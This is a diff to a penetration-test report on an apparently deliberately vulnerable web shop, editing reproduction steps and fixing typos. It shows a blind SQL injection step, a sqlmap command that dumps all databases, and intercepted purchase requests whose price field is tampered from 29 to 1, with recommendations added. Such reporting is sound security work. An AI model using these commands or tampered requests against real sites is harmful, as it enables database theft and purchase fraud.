@@ -202,7 +202,7 @@ Test
 
 ------WebKitFormBoundaryq47yQI2jPO4y7p7J--
 ```
-5) Above request will amke the web app to sleep for 5 sec 
+5) Above request will make the web app to sleep for 5 sec 
 
 ![Alt Text](https://i.ibb.co/FKQRWP7/sqlblind.png)
 
@@ -210,7 +210,7 @@ Test
 ```python
 python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch --dbms=mysql --threads=10 --dump-all
 ```
-7) You shloud see db getting dumped
+7) Shloud see db getting dumped
 
 ![Alt Text](https://i.ibb.co/Qpw8sDq/dump-db.png)
 
@@ -240,8 +240,32 @@ Have a waf or sanitize user input before sending it to db
 ### High Impact
 
 ##### Buying anything!
-It was found that an attacker can buy anything from **http://foophones.securitybrigade.com:8080/buy_confirm.php** regardless of what amount of credit is availabe in his/her account. By manipulating the buying request as 
+It was found that an attacker can buy anything from **http://foophones.securitybrigade.com:8080/buy_confirm.php** regardless of what amount of credit is availabe in his/her account
 
+###### Steps To Reproduce: 
+
+1) Try to buy any product like **http://foophones.securitybrigade.com:8080/buy.php?id=1** and click on purchase and intercept the request in burp
+- Request => 
+```
+POST /buy_confirm.php HTTP/1.1
+Host: foophones.securitybrigade.com:8080
+Content-Length: 29
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://foophones.securitybrigade.com:8080
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://foophones.securitybrigade.com:8080/buy.php?id=1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
+Connection: close
+
+shipping=Finding&price=29&id=1
+```
+
+2) Change the price parameterpresent in body section to any value like price=1 and request it 
 - Request => 
 ```
 POST /buy_confirm.php HTTP/1.1
@@ -261,8 +285,7 @@ Connection: close
 
 shipping=Finding&price=1&id=1
 ```
-Note: Price parameter is changed from it's original value to 1.
-
+3) Shloud get a response like,
 - Response (interesting part only!) =>
 ```
 					
@@ -275,7 +298,10 @@ Note: Price parameter is changed from it's original value to 1.
 
 Filling account !
 ```
-- Recommendation:
+###### Impact:
+Attacker can buy anything at any price.
+
+###### Recommendation:
   User supplied data shloud be propelry checked before sending it to backend.
 
 ##### Filling Up account balance.
